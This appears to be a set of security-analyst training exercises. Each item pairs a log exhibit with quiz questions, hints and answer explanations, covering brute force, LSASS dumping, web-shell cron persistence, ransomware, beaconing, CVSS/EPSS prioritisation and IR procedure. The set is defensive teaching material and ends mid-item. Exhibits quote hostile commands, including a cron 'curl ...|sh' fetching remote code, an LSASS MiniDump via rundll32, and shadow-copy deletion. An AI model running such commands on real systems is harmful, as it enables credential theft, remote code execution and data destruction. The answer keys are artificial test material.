title: Brute Force Then Success on Domain Controller
brief: The SIEM correlated a burst of failed logons followed by a single success against a privileged account on a domain controller. Triage the authentication events.
exhibit: 10:14:01 EventID=4624 user=svc_backup src=10.10.5.20 LogonType=3 (normal) 10:22:03 EventID=4625 user=Administrator src=45.83.193.12 status=0xC000006A (bad pw) 10:22:04 EventID=4625 user=Administrator src=45.83.193.12 status=0xC000006A (bad pw) ... 318 EventID=4625 for user=Administrator from 45.83.193.12 in 90s ... 10:23:38 EventID=4624 user=Administrator src=45.83.193.12 LogonType=10 (RemoteInteractive) 10:23:41 EventID=4672 Special privileges assigned to new logon user=Administrator

fields.label: Suspicious indicator
fields.hint: Look at the volume and the source address.
options: Hundreds of failed Administrator logons from an external IP followed by a success
fields.explain: 318 EventID 4625 failures with status 0xC000006A (bad password) from a single external IP, then a 4624 success, is the signature of a successful brute-force against the privileged account.

fields.label: Most likely technique
fields.explain: Repeated bad-password failures against one account from one source, ending in success, is classic online brute-force (password guessing), not a hash or ticket attack.

fields.label: Severity
fields.hint: A privileged DC account was compromised.
fields.explain: A successful RemoteInteractive logon as Administrator on a domain controller, with special privileges assigned, is full privileged compromise of a Tier 0 asset and is rated Critical.

fields.label: Correct first response
fields.hint: Stop the active session and access now.
options: Open a low-priority ticket for the help desk
Disable the Administrator account, kill the session, and block 45.83.193.12 at the edge
Wait for the next scan cycle
Increase the account lockout threshold only
fields.explain: Active privileged compromise demands immediate containment: terminate the attacker session, disable/reset the account, and block the source IP. Tuning lockout alone leaves the live session intact.

summary: An external brute-force succeeded against the DC Administrator account (4625 storm then 4624 + 4672). Contain by disabling the account, killing the session, and blocking the source IP.

title: EDR Flags LSASS Memory Access
brief: The EDR raised a behavioral alert on a finance workstation. The process tree shows an Office child process touching credential memory.
exhibit: parent: WINWORD.EXE (signed) child: powershell.exe -nop -w hidden -enc SQBFAFgA... -> rundll32.exe comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full handle opened: lsass.exe access=0x1010 (VM_READ|QUERY) outbound: 192.168.20.31 -> 45.61.139.8:443 TLS SNI=cdn-update.win baseline: WINWORD has never spawned powershell on this host before

fields.label: Suspicious indicator
fields.hint: What is the rundll32 line doing?
options: Dumping LSASS process memory to a file via comsvcs.dll MiniDump
fields.explain: rundll32 comsvcs.dll MiniDump against PID 712 (lsass) writes lsass.dmp, a hands-on technique to harvest cached credentials from memory.

fields.label: Most likely ATT&CK technique
fields.explain: Accessing lsass memory and dumping it maps to T1003.001, OS Credential Dumping via LSASS Memory.

fields.label: Severity
fields.explain: A macro-spawned PowerShell that dumps LSASS and beacons outbound indicates active credential theft and likely C2, a Critical, high-confidence compromise.

fields.label: Correct first response
fields.hint: Cut the host off before the dump leaves.
options: Network-isolate the host via EDR and preserve the lsass.dmp for analysis
Ask the user to close Word
fields.explain: Network isolation (EDR quarantine) stops exfiltration and lateral movement while preserving the dump and memory as evidence. Rebooting or deleting destroys volatile evidence.

summary: A malicious macro spawned PowerShell that dumped LSASS (T1003.001) and beaconed out. Network-isolate the host immediately, preserve the dump, and rotate any credentials that were on the box.

title: Suspicious Scheduled Task Persistence
brief: Auditd and Sysmon events on a Linux jump host show an unexpected cron entry and an outbound connection created seconds after a web shell upload.
exhibit: 13:02:11 httpd: POST /uploads/img.php 200 src=203.0.113.44 size=1180 13:02:12 EXECVE /bin/sh -c "id; uname -a" uid=33(www-data) 13:02:40 cron: NEW entry */5 * * * * www-data curl -s http://45.9.148.2/a|sh 13:03:00 conn www-data 45.9.148.2:80 ESTABLISHED bytes_out=842 13:05:00 cron: */5 job executed -> curl 45.9.148.2 -> /bin/sh

fields.label: Suspicious indicator
options: A web shell upload followed by a cron job that fetches and runs remote code every 5 minutes
fields.explain: img.php is a PHP web shell; www-data then writes a cron entry that curls a remote host and pipes to sh every 5 minutes, establishing persistent remote execution.

fields.label: Most likely technique
fields.hint: The cron entry survives reboots and re-runs.
fields.explain: Adding a recurring cron job that re-fetches and executes attacker code is persistence via T1053.003 (Cron).

fields.label: Severity
fields.explain: An active web shell with established remote code execution and a persistence mechanism reaching out to an external host is a High-severity server compromise.

fields.label: Correct first response
fields.hint: Remove the recurring callback and the entry point.
options: Remove the malicious cron entry and web shell, kill www-data's outbound session, and isolate the host
Add the C2 IP to a watchlist only
fields.explain: Containment removes the persistence (cron) and the web shell, kills the active connection, and isolates the host so the attacker cannot re-establish access; a reboot would not remove the cron job.

summary: A PHP web shell led to a cron-based persistence job (T1053.003) calling out to attacker infrastructure. Remove the cron entry and web shell, kill the session, isolate, and hunt for further footholds.

title: Impossible Travel / Token Theft in M365
brief: The cloud SIEM raised a session anomaly: a single user account signed in from two geographically distant locations within minutes, then created a mailbox forwarding rule.
exhibit: 08:01:10 SignIn user=jdoe@corp.com ip=72.21.5.10 city=Austin mfa=satisfied 08:09:55 SignIn user=jdoe@corp.com ip=102.89.40.7 city=Lagos mfa=not_required(token) 08:11:02 Set-InboxRule user=jdoe Name="." ForwardTo=ext-collector@mail.ru DeleteMessage=true 08:12:20 New-AppPassword created user=jdoe distance Austin->Lagos ~ 11,000 km in 8m = ~82,000 km/h

fields.label: Suspicious indicator
fields.hint: Compare the two sign-in cities and times.
options: Impossible travel: two logins 11,000 km apart in 8 minutes, the second satisfying MFA via a stolen token
fields.explain: Two sign-ins from Austin and Lagos eight minutes apart is physically impossible; the Lagos session satisfied MFA without a prompt, indicating a stolen session token/cookie.

fields.label: Most likely technique
fields.hint: MFA was bypassed using an existing session artifact.
options: Steal Web Session Cookie / token theft enabling MFA bypass (T1539)
fields.explain: Replaying a stolen session token to bypass MFA maps to T1539 (Steal Web Session Cookie); the new forwarding rule is exfiltration setup.

fields.label: Severity
fields.hint: Account is compromised and exfil is configured.
fields.explain: A hijacked account with MFA bypassed plus an auto-forward to an external address (silent mailbox exfiltration) and a new app password is a High-severity business-email-compromise event.

fields.label: Correct first response
fields.hint: Existing tokens must be killed, not just the password.
options: Revoke all active sessions/tokens, disable the account, and delete the malicious forwarding rule and app password
Email the user to be careful
Block Lagos at the firewall and stop
fields.explain: Because a token was stolen, a password reset alone leaves the session valid; you must revoke sessions/refresh tokens, disable the account, and remove the forwarding rule and app password to cut off exfiltration.

summary: Stolen-token impossible travel (T1539) led to BEC with an auto-forward rule and rogue app password. Revoke all sessions, disable the account, remove the rule/app password, then investigate scope.

title: Ransomware Pre-Encryption Behavior
brief: The EDR fired multiple high-confidence alerts on a file server: shadow copies were deleted and thousands of files were renamed with a new extension in minutes.
exhibit: 02:14:09 vssadmin.exe delete shadows /all /quiet 02:14:10 wbadmin delete catalog -quiet 02:14:12 bcdedit /set recoveryenabled No 02:14:20 file ops: 9,142 files renamed *.docx -> *.docx.lkd in 47s 02:14:55 dropped: C:\Share\READ_ME_TO_DECRYPT.txt 02:15:30 SMB connections to 14 internal hosts on 445 initiated

fields.label: Suspicious indicator
fields.hint: Shadow copies gone, mass renames, ransom note.
options: Shadow-copy deletion plus mass file renaming and a ransom note: active ransomware encryption
fields.explain: Deleting volume shadow copies and backup catalogs, disabling recovery, mass-renaming files to a new extension, and dropping a decrypt note are textbook ransomware impact behaviors.

fields.label: Most likely technique
options: Inhibit System Recovery (T1490) preceding Data Encrypted for Impact (T1486)
fields.explain: vssadmin/wbadmin/bcdedit map to T1490 (Inhibit System Recovery), executed just before T1486 (Data Encrypted for Impact); the SMB fan-out indicates attempted spread.

fields.label: Severity
fields.hint: Production data is being encrypted and it is spreading.
fields.explain: Active encryption of a production file server with lateral SMB propagation is a Critical incident threatening availability across the environment.

fields.label: Correct first response
fields.hint: Stop the spread and the encryption process now.
options: Network-isolate FS-PROD02, kill the encrypting process, and block SMB to contain lateral spread
Run a full antivirus scan and wait
Reboot the server to clear it
fields.explain: Immediate containment isolates the host, terminates the encryption process, and blocks SMB to halt propagation; rebooting can complete encryption and destroy memory artifacts, and paying is not a containment action.

summary: Ransomware deleted shadow copies (T1490) and began encrypting files (T1486) while spreading over SMB. Isolate the host, kill the process, block SMB laterally, then move to eradication and restore from offline backups.

title: DNS Beaconing From a Workstation
brief: A SIEM detection flagged a host making regular, identically-sized DNS TXT queries to a single rarely-seen domain throughout the night.
exhibit: 00:00:03 query TXT 3f8a.cdn-sync.io len=243 resp=NXDOMAIN... 211 bytes 00:01:03 query TXT 9c2e.cdn-sync.io len=243 resp=211 bytes 00:02:03 query TXT b71d.cdn-sync.io len=243 resp=211 bytes ... query every 60s +/- 1s for 6 hours, unique subdomain each time ... domain cdn-sync.io registered 4 days ago, never resolved by any other host no browser process; queries originate from svchost-named binary in %TEMP%

fields.label: Suspicious indicator
fields.hint: Regular interval, unique subdomains, TXT records.
options: Periodic same-size TXT queries to a newly-registered domain with random subdomains: beaconing/DNS tunneling
fields.explain: Fixed 60-second intervals, constant payload size, high-entropy subdomains, TXT records, and a 4-day-old domain are hallmarks of automated C2 beaconing/DNS tunneling rather than human activity.

fields.label: Most likely technique
options: Application Layer Protocol: DNS for C2 (T1071.004)
fields.explain: Encoding C2 traffic in DNS queries/responses maps to T1071.004, Application Layer Protocol: DNS, a common covert channel.

fields.label: Severity
fields.hint: Suspected active C2 from an unknown binary.
fields.explain: A persistent covert C2 channel from an unsigned %TEMP% binary indicates an established foothold and likely compromise, rated High pending scope determination.

fields.label: Correct first response
fields.hint: Cut the channel and capture the implant.
options: Whitelist cdn-sync.io to reduce alert noise
Sinkhole/block cdn-sync.io, isolate WS-2204, and capture the suspicious binary for analysis
Clear the DNS cache and close the alert
fields.explain: Containment blocks/sinkholes the C2 domain, isolates the host to stop tasking, and preserves the implant for analysis; whitelisting the domain would aid the attacker.

summary: Regular TXT beaconing to a new domain (T1071.004) from a %TEMP% binary indicates active C2. Block/sinkhole the domain, isolate the host, capture the binary, and pivot to find other affected systems.

title: Interpreting a CVSS v3.1 Vector
brief: A vulnerability scan returned a finding on an internet-facing application server. Decompose the CVSS v3.1 base vector to confirm the severity before scheduling remediation.
exhibit: Asset: web-edge01 (Internet-facing, 0.0.0.0/0) CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Vendor base score: 9.8 (Critical) EPSS: 0.91 Public exploit: Metasploit module available Compensating control: none (no WAF in path)

fields.label: What does AV:N mean?
options: Attack Vector is Network: exploitable remotely over the network
fields.explain: AV:N is Attack Vector: Network, meaning the vulnerability is remotely exploitable across a network, the broadest and most dangerous exposure.

fields.label: What do PR:N and UI:N together indicate?
options: High privileges and a click are required
No privileges and no user interaction are required to exploit
The user must open a file
fields.explain: PR:N (no privileges required) and UI:N (no user interaction) mean an unauthenticated attacker can exploit it with zero victim involvement, maximizing exploitability.

fields.label: Which qualitative severity matches a 9.8 base?
fields.explain: A base score of 9.8 falls in the 9.0-10.0 band, which is Critical severity in CVSS v3.1.

fields.label: Why prioritize this finding for immediate remediation?
options: It is internal-only and low EPSS
It is Critical, internet-facing, has no compensating control, a public exploit, and EPSS 0.91 (high exploitation probability)
Because the asset is a test box
fields.explain: Risk-based prioritization combines a Critical score with real-world context: internet exposure, no WAF, a working public exploit, and a 0.91 EPSS (high near-term exploitation likelihood) make this a top remediation priority.

summary: The vector AV:N/AC:L/PR:N/UI:N with C/I/A all High yields a 9.8 Critical, remotely exploitable with no auth. Combined with internet exposure, EPSS 0.91, and a public exploit, it is a top-priority fix.

title: Prioritizing Findings With EPSS and Exposure
brief: Four findings were returned across different assets. Limited remediation capacity this sprint means you must rank by true risk, not raw CVSS alone.
exhibit: CVE CVSS EPSS ASSET EXPOSURE EXPLOIT A CVE-26-1101 9.9 0.02 lab-test09 Internal lab none B CVE-26-1140 8.1 0.94 vpn-gw01 Internet-facing in-the-wild C CVE-26-1177 7.5 0.05 printserv03 Internal none D CVE-26-1190 6.5 0.31 hr-portal Internet-facing PoC only

fields.label: What does EPSS represent?
fields.hint: It is a probability, not an impact score.
options: The probability a vulnerability will be exploited in the wild in the near term
fields.explain: EPSS (Exploit Prediction Scoring System) estimates the probability (0-1) that a CVE will be exploited in the wild within ~30 days; it complements CVSS impact with likelihood.

fields.label: Which finding should be remediated FIRST?
fields.hint: Highest combination of exposure, EPSS, and active exploitation.
options: B (CVSS 8.1, internet-facing, EPSS 0.94, exploited in the wild)
fields.explain: B is internet-facing on a VPN gateway with EPSS 0.94 and confirmed in-the-wild exploitation; despite a lower CVSS than A, its real-world risk is far higher.

fields.label: Why is finding A NOT the top priority despite CVSS 9.9?
options: It sits on an isolated internal lab asset with EPSS 0.02 and no known exploit, so likelihood and exposure are minimal
fields.explain: Risk = impact x likelihood x exposure. A's near-zero EPSS, lack of exploit, and isolated lab placement make actual risk low even though the impact score is high.

fields.label: Which factor most changes priority beyond the base CVSS score?
options: Threat/environmental context: exploitation activity (EPSS/KEV) and asset exposure
fields.explain: Modern risk-based prioritization weights threat context (EPSS, CISA KEV, active exploitation) and environmental exposure on top of the base score, which is why B outranks the higher-CVSS A.

summary: Rank by real risk: internet-facing CVE-26-1140 with EPSS 0.94 and in-the-wild exploitation is first, ahead of the CVSS-9.9 lab finding whose exposure and likelihood are minimal.

title: Reading a CVSS v4.0 Vector
brief: A newer scanner reports findings using CVSS v4.0. Interpret the base metrics and the new metric groups to brief leadership on the finding's nature.
exhibit: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N Base score: 8.7 (High) Asset: api-gw02 Privilege needed: standard API key (PR:L) VC/VI/VA = vulnerable system impact; SC/SI/SA = subsequent system impact

fields.label: What is new in CVSS v4.0's AT metric?
fields.hint: AT did not exist in v3.1.
options: Attack Requirements: conditions beyond the attacker's control needed to exploit
fields.explain: v4.0 adds Attack Requirements (AT), describing prerequisite conditions (e.g., a race window) beyond the attacker's control; AT:N means no special conditions are required.

fields.label: What does PR:L indicate here?
options: Low privileges are required (e.g., a standard authenticated API key)
fields.explain: PR:L means the attacker needs low-level privileges, here a standard API key, rather than being fully unauthenticated (PR:N) or needing admin (PR:H).

fields.label: What do the VC:H/VI:H values measure?
options: Confidentiality and Integrity impact to the vulnerable system itself, both High
fields.explain: In v4.0 the VC/VI/VA metrics rate impact to the vulnerable system; VC:H and VI:H mean High confidentiality and integrity loss on the affected component.

fields.label: How should this 8.7 finding be prioritized?
fields.hint: High severity, low-auth, network-reachable, no subsequent impact.
options: Ignore it; v4.0 scores are advisory
Treat as High priority: network-reachable with only low privileges and High confidentiality/integrity loss on the vulnerable system
Lowest priority because SC/SI/SA are None
fields.explain: An 8.7 High that is network-exploitable with only a standard API key and causes High C/I loss warrants prompt remediation; the None subsequent-system metrics limit blast radius but do not lower the vulnerable-system risk.

summary: CVSS v4.0 adds Attack Requirements (AT) and splits vulnerable-system (VC/VI/VA) from subsequent-system (SC/SI/SA) impact. This 8.7 High is network-reachable with low privileges and High C/I loss, so it is high priority.

title: False Positive Validation Before Remediation
brief: A scanner reported a Critical OpenSSL flaw on a host, but the patch team pushed back. Validate the finding against the actual installed version before opening a change.
exhibit: Scanner: CVE-2026-0512 OpenSSL < 3.0.14 vulnerable CVSS 9.1 Scanner detection method: banner/version inference from port 443 Host evidence: rpm -q openssl => openssl-3.0.16-2.el9 (patched) Backported fix: vendor changelog confirms CVE-2026-0512 fixed in 3.0.16-2 Banner still advertises '3.0.13' due to static build string

fields.label: What is the discrepancy?
fields.hint: Compare scanner inference to installed package.
options: The host is unpatched and the scanner is right
The banner reports 3.0.13 but the installed, vendor-patched package is 3.0.16-2
fields.explain: The scanner inferred vulnerability from a stale banner string, but rpm shows openssl-3.0.16-2 with the CVE fix backported, so the running software is actually patched.

fields.label: What is a backported patch?
fields.hint: Vendors fix without bumping the upstream version.
options: A security fix applied to an older version branch without changing the displayed upstream version number
A patch only for new installs
fields.explain: Enterprise distros backport security fixes into their packaged version (e.g., 3.0.16-2.el9), so banner/version-only scanners can flag a fixed system as vulnerable.

fields.label: How should this finding be classified?
fields.hint: The vulnerability is not actually present.
options: False positive: the active package contains the backported fix
fields.explain: Because the installed package already contains the fix, the scanner result is a false positive driven by version-string inference, not an exploitable condition.

fields.label: Best next action?
fields.hint: Resolve the finding correctly and tune the tool.
options: Force a downgrade to clear the alert
Mark it a validated false positive, document the evidence, and tune the scanner to use authenticated/package-level checks
fields.explain: Document the validation evidence, close it as a false positive, and switch to authenticated/credentialed scanning so version detection reads the real package rather than a banner string.

summary: A banner-based scanner flagged patched OpenSSL as vulnerable; rpm proves the CVE was backported into 3.0.16-2. Classify as a validated false positive, document it, and move to authenticated scanning.

title: KEV Catalog Drives the Patch Window
brief: Two findings compete for an emergency change window. Use the CISA KEV catalog and due-date guidance to decide which gets the emergency patch.
exhibit: CVE CVSS IN-KEV KEV-DUE ASSET EXPOSURE X CVE-26-2001 7.2 YES in 3 days citrix-adc01 Internet Y CVE-26-2055 9.4 NO n/a intranet-wiki Internal KEV = CISA Known Exploited Vulnerabilities (proven active exploitation) Org policy: KEV items patched by CISA due date regardless of CVSS

fields.label: What does inclusion in the CISA KEV catalog signify?
options: The vendor has retired the product
The vulnerability has confirmed, active exploitation in the wild
fields.explain: A CVE in the KEV catalog has reliable evidence of active exploitation in the wild, which is a stronger risk signal than CVSS alone.

fields.label: Which finding takes the emergency window?
fields.hint: Active exploitation plus a due date and internet exposure.
options: X, because it is KEV-listed (actively exploited), internet-facing, and due in 3 days
fields.explain: X is on an internet-facing appliance, actively exploited (KEV), with a binding 3-day due date; active exploitation and exposure outweigh Y's higher but unexploited CVSS.

fields.label: Why might the lower-CVSS finding be more urgent?
options: KEV status proves real-world exploitation, raising likelihood far above an unexploited higher-CVSS bug
Lower CVSS always means more urgent
Internal assets are riskier than internet ones
CVSS and KEV are unrelated to urgency
fields.explain: CVSS measures potential severity; KEV adds confirmed exploitation likelihood. An actively exploited, internet-exposed 7.2 is more urgent than an unexploited, internal 9.4.

fields.label: What should drive the remediation deadline for X?
options: The CISA KEV due date mandated by policy (3 days)
fields.explain: Org policy ties KEV items to the CISA due date regardless of CVSS, so X must be remediated within the 3-day KEV deadline.

summary: KEV status means confirmed active exploitation. Internet-facing, KEV-listed CVE-26-2001 (due in 3 days) takes the emergency window over the higher-CVSS but unexploited internal finding.

title: Risk Acceptance vs. Remediation Decision
brief: A legacy medical device cannot be patched without voiding its certification. Evaluate the metrics and compensating controls to recommend the correct risk treatment.
exhibit: CVE-2026-7781 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H 9.8 Asset: infusion-pump-fw v2.1 (FDA-certified, vendor patch not available) EPSS: 0.04 No public exploit Network: isolated clinical VLAN Compensating controls available: VLAN ACL, no inbound from corp, IDS monitoring Decision owner: clinical engineering + CISO sign-off required

fields.label: Why can't standard remediation (patching) be applied?
options: The CVE is a false positive
No vendor patch exists and patching would void FDA certification of the device
The CVSS is too low to matter
fields.explain: The device has no available vendor patch and altering firmware would void its FDA certification, so traditional patch remediation is not viable.

fields.label: Which treatment fits when patching is impossible but risk must be reduced?
fields.hint: Reduce exposure without altering the device.
options: Risk avoidance by deleting the data
Risk mitigation via compensating controls (segmentation, ACLs, IDS)
Transfer all risk to the vendor
fields.explain: When you cannot patch, you mitigate by applying compensating controls, here network isolation, ACLs, and IDS monitoring, to reduce the likelihood of exploitation.

fields.label: What lowers the real-world likelihood here despite CVSS 9.8?
options: Isolation on a clinical VLAN with no inbound corp access, EPSS 0.04, and no public exploit
fields.explain: Segmentation removes network reachability from untrusted zones, and EPSS 0.04 with no public exploit indicates low near-term exploitation likelihood, sharply reducing residual risk.

fields.label: Who must formally accept any residual risk?
fields.hint: Risk acceptance is a management decision.
options: The accountable business/risk owner (e.g., CISO with clinical engineering), documented and time-bound
fields.explain: Residual risk acceptance is a management decision that must be formally documented, time-bound, and signed off by the accountable risk owner (CISO/clinical engineering), not made unilaterally by an analyst.

summary: An unpatchable FDA device gets mitigated with compensating controls (VLAN isolation, ACLs, IDS) that cut exposure; the documented, time-bound residual risk is formally accepted by the CISO/clinical engineering owner.

title: Identifying the Current IR Phase
brief: An incident is unfolding. The team has confirmed malware on three hosts and pulled their network cables, but the malware is still present on disk. Map activities to the IR lifecycle.
exhibit: [DONE] Alert triaged, scope confirmed: 3 infected hosts identified [NOW] Infected hosts disconnected from the network to stop spread [PENDING] Remove malware / rebuild hosts [PENDING] Restore to production and monitor [PENDING] Lessons-learned report NIST SP 800-61 phases in play

fields.label: Which IR phase is the [NOW] activity?
fields.explain: Disconnecting infected hosts to stop the spread is Containment: limiting the incident's impact before removing the threat.

fields.label: The [DONE] triage/scope step belongs to which phase?
fields.explain: Triaging the alert and confirming scope is part of Detection and Analysis, where the team validates and characterizes the incident.

fields.label: What is the correct NEXT phase after containment here?
options: Eradication, remove the malware / rebuild the hosts
fields.explain: After containment, Eradication removes the threat (malware removal or host rebuild) before systems can be safely restored in Recovery.

fields.label: Why must eradication precede recovery?
options: Restoring hosts still containing malware would reintroduce the threat into production
Eradication and recovery are the same step
fields.explain: Returning a host to production before the malware is removed would reinfect the environment, so eradication must complete first.

summary: Per NIST SP 800-61: triage/scope was Detection and Analysis, disconnecting hosts is Containment, and the next phase is Eradication (remove malware/rebuild) before Recovery, since restoring infected hosts would reintroduce the threat.

title: Order of Volatility for Evidence Collection
brief: Before powering down a compromised host for forensic imaging, the responder must collect evidence in the correct order to preserve the most fragile data first.
exhibit: Sources available to collect: A) CPU registers / cache B) RAM (running processes, network connections) C) Disk / file system D) Archived backups / remote logs RFC 3227 order-of-volatility applies

fields.label: Which source is MOST volatile and collected first?
fields.explain: CPU registers and cache are the most volatile, changing instantly, so per RFC 3227 they are collected first (though in practice RAM capture is the first feasible step).

fields.label: What is the correct overall order (most to least volatile)?
fields.explain: Order of volatility runs most-to-least fragile: CPU registers/cache, then RAM, then disk/file system, then archival backups and remote logs.

fields.label: Why capture RAM before imaging the disk?
options: Volatile artifacts (running malware, decryption keys, live connections) exist only in memory and vanish on shutdown
fields.explain: Memory holds ephemeral artifacts, injected code, encryption keys, and active network sessions, that are lost when the system powers off, so it must be captured before the disk image.

fields.label: What documentation must accompany each evidence item?
options: A chain-of-custody record (who collected it, when, hashes, handoffs)
fields.explain: Each item needs a chain-of-custody record with collector, timestamps, cryptographic hashes, and every transfer, to prove integrity and preserve admissibility.

summary: Per RFC 3227 collect most-to-least volatile: CPU registers/cache, RAM, disk, then backups. Capture memory before disk to preserve live malware and keys, and maintain chain of custody with hashes on every item.

title: Choosing the Containment Strategy
brief: A worm is spreading laterally across a production subnet via SMB. Leadership needs a containment decision that stops spread while preserving forensic evidence and critical services.
exhibit: Worm spreading SMB(445) across 10.30.0.0/24, 22 hosts infected, 60 clean Option 1: Power off all 82 hosts immediately Option 2: Block 445 between segments + isolate infected VLAN, keep clean hosts up Option 3: Do nothing, continue monitoring Business: order-entry app on 12 clean hosts must stay available Goal: stop spread, preserve evidence, minimize business impact

fields.label: Which containment option best meets all goals?
fields.hint: Stop spread without destroying evidence or all services.
options: Option 2: block SMB between segments and isolate the infected VLAN
Power off only the clean hosts
fields.explain: Segmentation/isolation blocks the SMB propagation path and quarantines infected hosts while keeping clean, business-critical systems online and preserving volatile evidence.

fields.label: Why is powering off all hosts a poor first choice?
options: It destroys memory-resident evidence and needlessly takes down clean, business-critical systems
fields.explain: A mass shutdown erases volatile RAM evidence and causes avoidable outages of clean systems, conflicting with the evidence-preservation and availability goals.

fields.label: What distinguishes containment from eradication here?
fields.hint: Stopping spread vs. removing the threat.
options: Containment limits/halts spread (segment, isolate); eradication removes the worm and remediates infected hosts
fields.explain: Containment stops the worm from spreading (network isolation/SMB block), while eradication is the later removal of the malware and cleanup of infected hosts.

fields.label: After isolating, what preserves attribution evidence on infected hosts?
options: Capture memory and relevant logs with chain of custody before eradication
fields.explain: Before eradicating, capture volatile memory and logs under chain of custody so the worm's behavior and source can be analyzed; reimaging first would destroy that evidence.

summary: Segment-and-isolate (block SMB, quarantine the infected VLAN) stops the worm while keeping clean critical hosts up and preserving volatile evidence, then capture memory/logs under chain of custody before eradication.

title: Ordering the Recovery Steps
brief: Eradication is complete on a set of rebuilt servers. Place the recovery activities in the correct sequence before returning them to full production.
exhibit: Unordered recovery tasks: W) Restore data from known-good (pre-compromise) backups X) Validate systems are clean and patched against the exploited flaw Y) Reconnect to production network with enhanced monitoring Z) Monitor for signs of reinfection / attacker return before declaring closed Goal: safe return to operations

fields.label: Which step comes FIRST in recovery?
fields.hint: Confirm clean before trusting the host.
options: Validate systems are clean and patched against the exploited vulnerability
fields.explain: Recovery starts by validating that rebuilt systems are clean and the exploited vulnerability is patched, otherwise you risk restoring an exploitable host.

fields.label: Why restore from PRE-compromise backups specifically?
options: Backups taken after compromise may contain malware or attacker artifacts
Pre-compromise backups are faster to restore
It does not matter which backup is used
fields.explain: Backups created after the intrusion could reintroduce malware, web shells, or tampered data, so you must restore from a known-good point predating the compromise.

fields.label: What is the correct order of the four tasks?
fields.explain: Validate/patch (X), restore good data (W), reconnect with enhanced monitoring (Y), then continue monitoring for reinfection (Z) before closing the incident.

fields.label: Why keep enhanced monitoring after reconnecting?
options: To detect reinfection or the attacker's return, confirming eradication actually held
Monitoring is required by the vendor
fields.explain: Heightened monitoring after restoration verifies the threat is truly gone and quickly catches any attacker re-entry before the incident can be declared closed.

summary: Recovery order: validate/patch systems, restore from known-good pre-compromise backups, reconnect with enhanced monitoring, then watch for reinfection before closing. Post-compromise backups risk reintroducing the threat.

title: Chain of Custody and Evidence Handling
brief: A laptop is seized as evidence in a suspected insider data theft. Establish proper evidence-handling so the findings hold up if the matter goes to litigation.
exhibit: Item: ThinkPad X1, S/N R9K22; seized 2026-06-22 14:05 by analyst K. Ruiz Action needed: create forensic image before any analysis Original disk SHA-256: 4f1c...e09a (recorded at acquisition) Storage: tamper-evident bag, locked evidence safe Every transfer must be logged with date/time/handler/signature

fields.label: Analysis should be performed on what?
options: A verified forensic (bit-for-bit) image, leaving the original untouched
A cloud copy of selected files
fields.explain: Forensic analysis is done on a verified bit-for-bit image so the original evidence remains pristine and unaltered for the record and any re-examination.

fields.label: What does the SHA-256 hash provide?
options: Integrity verification: proves the image matches the original and was not altered
fields.explain: Hashing the original at acquisition and the image afterward proves they are identical, establishing evidence integrity that the data was not modified.

fields.label: What must the chain-of-custody log capture for every handoff?
options: Date/time, who handled it, what was done, and signatures for each transfer
fields.explain: Chain of custody documents every person who possessed the evidence, when, what they did, and signed handoffs, demonstrating continuous, accountable control.

fields.label: Why does rigorous chain of custody matter?
options: It preserves the evidence's integrity and admissibility in legal proceedings
It is only an internal formality
fields.explain: An unbroken, documented chain of custody is required to demonstrate the evidence is authentic and untampered, which is essential for it to be admissible in court.

summary: Image the disk bit-for-bit and analyze the copy, verify integrity with SHA-256 hashes, store in tamper-evident packaging, and log every signed transfer so the evidence stays intact and admissible in litigation.

title: Stakeholder Communication and Reporting
brief: A confirmed breach exposed customer PII. The IR lead must coordinate the right notifications and reporting obligations during and after the incident.
exhibit: Confirmed: 48,000 customer records (name, email, SSN) exfiltrated Stakeholders: legal, comms/PR, executive leadership, affected customers Regulatory: breach-notification deadlines may apply (e.g., 72h regimes) Internal: SOC, IR team, IT operations Goal: meet obligations, control messaging, avoid tipping off attacker

fields.label: Who should be engaged EARLY to guide breach-notification obligations?
options: Legal counsel (and privacy/compliance) to determine notification requirements and deadlines
No one until the incident is closed
fields.explain: Legal/compliance must be engaged early to interpret breach-notification laws (deadlines, regulators, affected individuals) given PII/SSN exposure.

fields.label: Why use out-of-band communication channels during an active incident?
fields.hint: Assume the attacker may be watching.
options: If corporate systems are compromised, in-band comms could tip off the attacker or be intercepted
fields.explain: When internal systems may be compromised, responders use out-of-band channels (e.g., phone, separate secure chat) so the attacker cannot read response plans or be alerted.

fields.label: What is the purpose of the post-incident lessons-learned report?
options: To assign blame to an individual
To document root cause, timeline, and improvements so similar incidents are prevented
fields.explain: The lessons-learned/after-action report captures root cause, timeline, what worked, and corrective actions to strengthen defenses; it is blameless and improvement-focused.

fields.label: Customer notification content should primarily include what?
options: What data was exposed, what the company is doing, and protective steps for affected individuals
fields.explain: Notifications should clearly state the data exposed, remediation underway, and concrete protective steps (e.g., credit monitoring), per regulatory and reputational requirements, without leaking sensitive technical detail.

summary: Engage legal/compliance early for notification deadlines, communicate out-of-band while systems may be compromised, notify affected customers with exposure and protective steps, and produce a blameless lessons-learned report.

title: Beaconing in a Zeek conn.log
brief: A threat hunt across Zeek connection logs surfaced a host with regular, equal-interval outbound connections to a single external IP. Read the indicator and choose a response.
exhibit: ts orig_h resp_h resp_p proto duration orig_bytes 00:00:05 10.12.4.31 194.5.249.18 443 tcp 0.31 512 00:05:05 10.12.4.31 194.5.249.18 443 tcp 0.29 512 00:10:05 10.12.4.31 194.5.249.18 443 tcp 0.30 520 ... connection every 300s +/- 2s, ~512 bytes each, 8 hours straight ... resp_h 194.5.249.18 not in any allowlist; no DNS lookup preceded it (hardcoded IP) JA3 TLS fingerprint matches known Cobalt Strike profile

fields.label: Which indicator best describes this traffic?
fields.hint: Equal intervals, equal sizes, one destination.
options: C2 beaconing: fixed-interval, low-jitter, similar-size connections to one external host
fields.explain: Regular 300-second intervals with small, near-constant payloads to a single hardcoded IP, plus a Cobalt Strike JA3 match, is classic command-and-control beaconing.

fields.label: Which protocol/port is in use, and why does it aid evasion?
options: TCP 443; blends with normal HTTPS traffic and is rarely blocked outbound
fields.explain: TCP 443 lets the beacon hide inside ordinary outbound HTTPS, which is almost always permitted egress, making detection by port alone difficult.

fields.label: What detail most strongly distinguishes this from legitimate HTTPS?
fields.hint: Think jitter, sizing, and the JA3.
options: The machine-like fixed interval, uniform payload size, no preceding DNS, and a known-malicious JA3 fingerprint
